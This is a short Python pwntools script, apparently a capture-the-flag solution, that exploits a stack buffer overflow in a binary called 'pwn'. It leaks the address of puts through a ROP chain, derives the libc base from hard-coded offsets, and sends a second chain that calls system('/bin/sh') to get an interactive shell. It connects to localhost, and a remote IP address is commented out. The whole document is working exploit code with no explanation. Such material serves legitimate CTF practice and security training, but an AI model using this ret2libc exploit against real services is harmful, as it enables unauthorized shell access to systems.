from pwn import *
context.log_level = "debug"
#p=remote('47.109.135.169',20015)
#p=process('./ret')
p=remote('127.0.0.1',9999)
elf=ELF('./pwn')
rdi=0x400763
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
ret=0x400506
plt=elf.sym['puts']
got=elf.got['puts']
att=elf.sym['attack']
p.recvuntil('Your name:\n')
payload='a'*0x28+p64(rdi)+p64(got)+p64(plt)+p64(att)
#payload='a'*0x28+p64(0x400697)

p.sendline(payload)
addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print hex(addr)
'''
libc_base = addr - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
'''
libc_base = addr -0x06f6a0
system = libc_base + 0x0453a0
binsh = libc_base +0x18ce57
payload='a'*0x28+p64(ret)+p64(rdi)+p64(binsh)+p64(system)+p64(att)
p.recvuntil('Your name:\n')
p.sendline(payload)
p.interactive()


